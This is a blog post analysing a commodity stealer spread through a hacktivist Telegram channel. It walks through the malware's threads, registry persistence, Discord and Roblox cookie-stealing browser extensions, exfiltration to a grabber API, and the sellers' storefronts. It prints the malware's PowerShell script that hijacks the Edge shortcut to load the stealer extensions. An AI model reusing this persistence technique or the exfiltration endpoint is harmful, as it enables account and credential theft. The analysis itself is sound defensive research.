# Uncovering a Palestinian & French Stealer Campaign

### An interesting file was dropped in a Telegram channel I was apart of with the message "i will be using my private stealer for #opisrael, message me to help it spread". This blog shows the world of Stealer-as-a-Service markets, and political hacktivism within Telegram against Israel, and a very noisy piece of malware!

### The Start:

As someone who is very interested in the latest hacking news/malware techniques/threat intelligence/etc, I am in a lot of "underground" Telegram channels, and sometimes, I will come across a new unique malware sample or someone will try and social engineer me into installing malware like my [Reversing a "Game Cheat" Blog](./reversinggamecheat.md)

In this case, it was in the "ℭ0𝔡3𝔅𝔯34𝔨3𝔯𝔰 ANONYMOUS" channel (I know, leave 'em be.. they're having fun) where one of their "leaders" known as "𝐒𝐡𝐚𝐫𝐢𝐟𝐟" posted a ```gofile.io``` link to a malicious stealer with the caption: "i will be using my private stealer for #opisrael, message me to help it spread".

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/b0e888a1-2ec7-4121-a68b-112702e348b4)

### The *"Threat Actor"*

Shariff, the one who sent the file, is a TikTok *"Threat Actor"* (heavy emphasis on the quotes) who posts videos related to hacking and the "life" of being a hacker (I think, idk figure it out yourself lol: [https://www.tiktok.com/@s.a.m.i.r_012](https://www.tiktok.com/@s.a.m.i.r_012) & Second account [https://www.tiktok.com/@s.a.m.i.r_01](https://www.tiktok.com/@s.a.m.i.r_01))

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/b5f83306-d6fe-428e-bef8-b2aba20eb85f)

He has a Yemen flag in his TikTok bio, so I believe he resides in Yemen and is supporting Palestine through the Israel v Palestine conflic by spreading malware to any Israeli citizens.

He also has a few other friends that post in the same Telegram channel and they like to post the same type of stuff, in case you wanted some more entertainment: [https://www.tiktok.com/@ii.clappz/video/7300147463090998535](https://www.tiktok.com/@ii.clappz/video/7300147463090998535) & [https://www.tiktok.com/@yoozy_1337/video/7295312479641505030](https://www.tiktok.com/@yoozy_1337/video/7295312479641505030)

My point I'm trying to prove is we are not dealing with an APT here. But I personally think it is interesting to see what these foreign "hacktivists" are up to, what malware they are using, and who they are working with.

### The File, named ```321chat.exe```:

- **32-bit Executable**
- **MD5 Hash:** ```4aec2a150e4135f61dff2e55de07b9e9```
- **File Description: "Usefull Application"** (??? I thought this was funny)
- **File is a Nullsoft Scriptable Install System (NSIS) type file**

I don't really know where to start with this malware, it is a stealer malware first of all, but not one that I have seen before. The hash has never been uploaded to VirusTotal and it is Fully Undetected: https://www.virustotal.com/gui/file/c7b11a2b9719590183eb1985f61b7b5b11b8bdead56003c65279d9a7c47b728a

Some new, unique malware! Just asking to be analysed. Let's get started.

### ProcDot Analysis:

I used ProcDot to visualize the malware layout and how it executes, and from my analysis, the file executes multiple child processes of itself, the most interesting one being ```PID: 4320```

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/3ea431b5-8be5-4df3-9def-7d147368fd1b)

This ```PID: 4320``` directly creates a thread with ```ID: 6184```, this thread is used for creating the persistence registry keys, and creating other threads that are used for stealing the users information and creating the final ZIP file which is eventually sent to the C2.

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/680da865-b93d-46fc-9572-2c7e441204b3)

^^^ ```TID: 6184``` creating a persistent registry key ^^^

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/cc2eaa4c-aae0-48d4-95f6-b6c7979801cb)

^^^ ```TID: 6184``` creating 4 separate threads ready for writing the stolen information into a ZIP file that will be sent to the C2 ^^^

Using ProcDot, we can actually target specific child processes and see what they were doing, since we are focusing on the stealer malware, I will change the render configuration to only show threads and processes created by ```PID: 4320```

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/4f51a841-ca9e-45c8-88a4-b1627767cea3)

### TID-6184, Hawkish Grabber

After this specific TID is created, we can see some DLLs being loaded, some communications being made to some servers, one of them specifically stood out to me, ```185.199.117.133:443```. The ```Child TIDs: 7068, 9708, 2984, and 7952``` were being used to download a zip file called ```"extensions.zip"```. Eventually, ```TIDs: 7068 and 7952``` both start reading data from the ZIP file then start writing data to the following folders:

```
C:\ProgramData\ChromeExtensionsNova\extension-cookies

C:\ProgramData\ChromeExtensionsNova\extension-tokens
```

These folders both contain .js files which are used to enumerate Discord account values and steal tokens and information:

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/bf171b43-d4ff-4826-a578-e3d87403a07e)

^^^ ```background.js``` script found inside ```C:\ProgramData\ChromeExtensionsNova\extension-tokens\js\``` ^^^

The script also shows some information about the type of stealer that is being used:

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/7a4c33f5-f22f-4073-ae29-28072983e74f)

As you can see, they have a Telegram: [https://t.me/Sordeal](https://t.me/Sordeal)

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/3a8fd3b8-259c-42c6-9c75-cd2d0dacd5ad)

They also have a Discord server where they sell access to the stealer for anywhere from $5 for 1 month access to $70 for 24 months access

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/2eaa2566-f1f8-452c-a123-ac5df1688f45)

Furthermore they have a Sellix page where you can again buy the stealer, although the Sellix site is a lot cheaper lol:

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/efe46598-624e-44b6-99c0-98c69749851b)

Anyways it looks like this one specifically is "Hawkish Grabber" considering the ```webhook_url``` variable seen above. Not sure if "Nova Sentinel" and "Hawkish Grabber" are the same thing, or if they are different, but this piece of the malware is definitely grabbing user information/cookies/tokens.

The other folder, ```C:\ProgramData\ChromeExtensionsNova\extension-cookies``` is a folder specifically targeting Roblox accounts and cookies, it then sends the data to the C2:

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/76a298ee-25cd-4f7d-9a04-61c75b61f391)

^^^ ```background.js``` script found inside ```C:\ProgramData\ChromeExtensionsNova\extension-cookies\scripts\``` ^^^

After the ZIP file is completely unpacked, it is deleted:

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/f10c0b2e-5e8f-4748-8653-d22a5e48927e)

Daddy TID ```6184``` then creates a new PS1 file called ```salutzasYm.ps1```

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/61b33229-c7d6-40a8-9e75-7bf496f19a42)

This file has the following contents:

```
$WshShell = New-Object -comObject WScript.Shell;
$Shortcut = $WshShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Microsoft Edge.lnk");
$Shortcut.Arguments = "--load-extension=C:\ProgramData\ChromeExtensionsNova\extension-cookies,C:\ProgramData\ChromeExtensionsNova\extension-tokens";
$Shortcut.Save()
```

This script is adding the extensions that were downloaded earlier into the default browser, once this is done, whenever the user opens their browser, it will auto redirect to Discord & Roblox and inject the cookie stealer which will steal the cookies and send it to the Hawkish Grabber API link seen earlier: ```https://hawkish.eu/grabber/nova/TkoCCyWOcryKWiOgbvNVgqBnekAvNhrIzrFdfPpknSHwnOQTqBxJWYDSkWhr```

Then the TID ```6184``` makes another persistent registry key for ```cmd.exe```, probably to ensure the PS1 web injection script executes at startup.

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/421a2aaa-aaaa-43ce-b642-3adbe61b96fd)

Later on it also makes one for ```powershell.exe```

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/a464f4a9-77b1-41b8-b7fe-09d2bbec2047)

Inbetween that, TID ```6184``` also writes some data to the ```System Info.txt``` file

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/e571d0a5-4bca-4e7b-8c0e-2bfa45b4a9e4)

NOTE, just incase you're confused with all the different TIDs being thrown around, TID ```6184``` is the main TID has been used for creating persistent registry keys, writing the stolen data to ```C:\Users\Analysis\AppData\Local\Temp\fMYoQic11EKsYaZdyub7``` (the ```fMYoQic11EKsYaZdyub7``` folder is randomly generated), and PID ```4320``` is the Parent Process that has created the Thread ID ```6184```. Finally, the ```Child TIDs: 7068, 9708, 2984, and 7952``` of which their Parent TID is ```6184```, were being used to download a zip file called ```"extensions.zip"```. But they will soon be used to write all of the stolen information inside ```C:\Users\Analysis\AppData\Local\Temp\fMYoQic11EKsYaZdyub7``` into a ZIP file called ```GB_NOVA_Analysis.zip``` (My computer name is Analysis, so it would be ```GB_NOVA_<YOUR-COMPUTER-NAME>.zip```)

Here is the Process Hierarchy:

- ```PID 4320``` = Main stealer process 
- ```TID 6184 "TID Daddy"``` = Main thread created by stealer process to manage persistence and steal information
- ```Child TIDs: 7068, 9708, 2984, and 7952``` = Child Threads created by "TID Daddy" used to download + setup the web injector that steals Discord Tokens & Roblox Cookies, and finally pack all stolen data into the ```GB_NOVA_Analysis.zip``` ZIP file.

After the persistence registry keys have been added, the stealer starts to enumerate the machine and write stolen information into the randomly generated folder in Temp ```(C:\Users\Analysis\AppData\Local\Temp\fMYoQic11EKsYaZdyub7)```, for example here below it is writing the stolen Discord information:

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/a3348c78-c6ed-4b1b-becb-2fa8fe36ddfd)

Though I dont have Discord on the VM, so it doesn't log anything:

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/54104f08-1adf-4c69-9f8e-e6baa36254af)

I managed to rip the folder from the Temp folder before it was Zipped up and sent to the C2 and deleted, this was the folder list:

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/e442efae-3764-4cdc-9fbe-67d41ac3a447)

It stole some information, nothing special, just a list of downloads and some dead cookies, but these txt files go to show that if i had any Credit Cards saved then they would be logged also:

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/e6da752e-3c02-4d64-9281-aaf3c2003f8a)

To get a look at some of the logs, here is my stolen history information lol

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/fa645265-fe5d-4afd-ae41-4266d9212f36)

(Yes, i was using Edge to download Firefox, what else do you use it for?)

It also steals system information, lists what applications are installed, and takes a screenshot of whatever is on the screen (will come back to this screenshotting function later). Along with this, it also steals Wi-Fi passwords because that is useful when you live nowhere near the victim. :)

![image](https://github.com/0xresetti/0xresetti.github.io/assets/114181159/1f7a1119-4ac8-4d1e-a66d-71e1e2fb8317)

